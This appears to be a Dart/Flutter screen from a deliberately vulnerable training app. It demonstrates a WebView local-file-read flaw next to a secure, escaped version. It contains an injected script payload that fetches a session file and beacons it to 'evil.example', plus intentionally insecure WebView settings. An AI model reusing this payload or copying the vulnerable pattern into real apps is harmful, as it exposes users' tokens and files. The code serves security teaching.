import 'dart:io' show File, Platform;

import 'package:flutter/material.dart';
import 'package:webview_flutter/webview_flutter.dart';
import 'package:webview_flutter_android/webview_flutter_android.dart';

import '../../../core/evidence_sink.dart';
import '../../../core/native/webview_file_bridge.dart';
import '../../../core/theme/dvma_colors.dart';
import '../../../core/vuln_demo_scaffold.dart';
import '../../../core/webview_demo_host.dart';
import 'local_file_webview.dart';

/// WebView Untrusted URL -> Local File Read (iOS WKWebView).
///
/// Unsanitized user-controlled fields are reflected into a WebView, and file
/// access is left enabled, so injected JS can read the app's local files from
/// the WebView context (ZOLL ePCR iOS CVE-2025-12699 class).
class WkwebviewUntrustedUrlLocalFileScreen extends StatefulWidget {
  const WkwebviewUntrustedUrlLocalFileScreen({super.key});

  static const String vulnId = 'wkwebview_untrusted_url_local_file';

  @override
  State<WkwebviewUntrustedUrlLocalFileScreen> createState() =>
      _WkwebviewUntrustedUrlLocalFileScreenState();
}

class _WkwebviewUntrustedUrlLocalFileScreenState
    extends State<WkwebviewUntrustedUrlLocalFileScreen> {
  /// The attacker-controlled field value reflected into the WebView.
  static const String _payload =
      "<script>fetch('file:///var/app/Documents/session.json')"
      ".then(r=>r.text()).then(t=>navigator.sendBeacon("
      "'https://evil.example/x',t))</script>";

  String? _vulnResult;
  String? _secureResult;

  WebViewController? _controller;
  String? _liveResult;

  @override
  void initState() {
    super.initState();
    // iOS: drive a real native WKWebView whose custom WKURLSchemeHandler serves
    // the attacker page and the secret under one origin (the plugin can't do
    // this, and the legacy file:// / allowFileAccessFromFileURLs tricks are dead
    // on modern WebKit).
    if (Platform.isIOS) {
      _bootNativeWkWebView();
      return;
    }
    if (!supportsRealWebView) return;
    _bootRealWebView();
  }

  /// iOS: ask the native `dvma/webview_file` channel to build a real WKWebView
  /// backed by a custom `WKURLSchemeHandler` (scheme `dvma-app://`) that serves
  /// both the untrusted page and a real seeded secret file under ONE origin, so
  /// the injected script's same-origin `fetch('secret')` genuinely reads the
  /// local file and reports the bytes. This is the current-iOS local-file
  /// disclosure primitive (MASTG-KNOW-0076 / MASTG-TEST-0335), a genuine
  /// on-device read, not a Dart model, and not the dead file:// / private-KVC
  /// technique.
  Future<void> _bootNativeWkWebView() async {
    final report = await WebviewFileBridge.readLocalFile(_payload);
    if (report == null || !mounted) return;
    DvmaEvidence.record(
      WkwebviewUntrustedUrlLocalFileScreen.vulnId,
      'webview-local-file',
      'real WKWebView (WKURLSchemeHandler same-origin) injected script '
          'read a local secret via fetch() -> $report',
    );
    setState(() => _liveResult = report);
  }

  /// Boots a real WebView that renders a local `file://`-origin page with the
  /// attacker field reflected UNESCAPED and file access enabled, so the
  /// injected <script> runs and fetch()es the app's own local file.
  Future<void> _bootRealWebView() async {
    try {
      final dir = await DvmaEvidence.artifactDirPath();
      if (dir == null) return;

      // Seed a real local secret file the injected script will try to read.
      final secretFile = File('$dir/wk_session.json');
      const secretBody = '{"token":"tok-8b21-secret"}';
      await secretFile.writeAsString(secretBody, flush: true);

      // Reflect the attacker payload UNESCAPED into an HTML file loaded from a
      // file:// origin. The payload's <script> fetch()es the local file and
      // reports the bytes back through the Exfil channel.
      final page = File('$dir/wk_report.html');
      final html =
          '<html><body><h1>Report for $_payload</h1>'
          '<script>'
          "fetch('file://${secretFile.path}').then(r=>r.text())"
          ".then(t=>Exfil.postMessage('read '+t))"
          ".catch(e=>Exfil.postMessage('blocked '+e));"
          '</script></body></html>';
      await page.writeAsString(html, flush: true);

      final controller = WebViewController()
        ..setJavaScriptMode(JavaScriptMode.unrestricted)
        ..addJavaScriptChannel(
          'Exfil',
          onMessageReceived: (JavaScriptMessage m) {
            DvmaEvidence.record(
              WkwebviewUntrustedUrlLocalFileScreen.vulnId,
              'webview-local-file',
              'injected script read local file via file:// origin -> '
                  '${m.message}',
            );
            if (!mounted) return;
            setState(() => _liveResult = m.message);
          },
        );

      // VULN: enable local file access, then load the page from a file://
      // origin so file:// fetch() from the page succeeds.
      final platform = controller.platform;
      if (platform is AndroidWebViewController) {
        await platform.setAllowFileAccess(true);
      }
      await controller.loadFile(page.path);
      if (!mounted) return;
      setState(() => _controller = controller);
    } catch (_) {
      // Best effort; the in-memory contrast panels still demonstrate the flaw.
    }
  }

  String _render(ReflectionResult r) {
    final b = StringBuffer();
    b.writeln('file access enabled : ${r.fileAccessEnabled}');
    b.writeln('script executed     : ${r.scriptExecuted}');
    b.writeln('leaked local files  : ${r.leakedLocalFiles}');
    if (r.exfiltratedFiles.isEmpty) {
      b.writeln('exfiltrated         : (none)');
    } else {
      r.exfiltratedFiles.forEach((path, contents) {
        b.writeln('exfiltrated         : $path -> $contents');
      });
    }
    b.writeln('rendered html       : ${r.renderedHtml}');
    return b.toString().trimRight();
  }

  void _run() {
    // VULN: reflect the field unescaped into a file://-origin WebView with
    // file access enabled.
    final webView = LocalFileWebView(fileAccessEnabled: true);
    final vuln = webView.reflect(_payload);
    // SECURE: HTML-escape the reflection AND disable file access.
    final secure = webView.reflectSafe(_payload);
    if (vuln.leakedLocalFiles) {
      DvmaEvidence.record(
        WkwebviewUntrustedUrlLocalFileScreen.vulnId,
        'webview-local-file',
        'unescaped reflection + file access on -> injected script read '
            '${vuln.exfiltratedFiles.keys.join(', ')}',
      );
    }
    setState(() {
      _vulnResult = _render(vuln);
      _secureResult = _render(secure);
    });
  }

  @override
  Widget build(BuildContext context) {
    return VulnDemoScaffold(
      vulnId: WkwebviewUntrustedUrlLocalFileScreen.vulnId,
      title: 'WebView Untrusted URL -> Local File Read (WKWebView)',
      difficulty: DvmaDifficulty.hard,
      explanation:
          'An unsanitized user-controlled field is reflected into HTML rendered '
          'in a WKWebView that was created with LOCAL FILE ACCESS enabled and a '
          'file:// origin. Injected JavaScript therefore runs and can fetch() '
          'the app\'s own local files (session tokens, patient records) and '
          'exfiltrate them (ZOLL ePCR iOS CVE-2025-12699 class). On a real '
          'device this runs a genuine WebView that actually reads the seeded '
          'local file: on iOS a real WKWebView backed by a custom '
          'WKURLSchemeHandler (dvma-app://) that serves the page and the secret '
          'under one origin (the legacy allowFileAccessFromFileURLs / file:// '
          'trick is dead on modern WebKit), and on Android a System WebView '
          'with setAllowFileAccess(true) reading over a file:// origin; '
          'off-device it falls back to a '
          'deterministic model. The secure path HTML-escapes the reflected '
          'field AND disables local file access, so the payload is inert and no '
          'files are reachable.',
      children: [
        DemoActionButton(label: 'Reflect attacker field', onPressed: _run),
        if (_vulnResult != null)
          EvidencePanel(
            label: 'unescaped reflection + file access on',
            value: _vulnResult!,
          ),
        if (_secureResult != null)
          EvidencePanel(
            label: 'escaped reflection + file access off',
            value: _secureResult!,
          ),
        if (_liveResult != null)
          EvidencePanel(
            label: 'REAL webview: injected script file:// read',
            value: _liveResult!,
          ),
        RealWebViewView(controller: _controller),
      ],
    );
  }
}
